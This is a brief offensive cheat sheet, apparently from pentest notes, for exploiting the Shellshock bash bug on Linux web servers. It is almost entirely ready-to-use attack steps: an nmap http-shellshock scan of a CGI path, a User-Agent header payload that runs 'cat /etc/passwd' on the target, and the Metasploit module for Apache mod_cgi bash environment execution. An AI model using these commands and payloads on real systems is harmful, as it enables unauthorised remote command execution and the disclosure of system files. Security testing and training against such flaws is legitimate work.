---
title: Shellshock Exploitation
category: initial-access
subcategory: web-attacks
os: linux
command: nmap --script=http-shellshock target
tools: nmap, msfconsole, burp
---


### Detection

```bash
nmap -sV 10.10.2.14 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```

### Burp Repeater payload (User-Agent header)

```
User-Agent: () { ;; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

### Metasploit

```bash
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
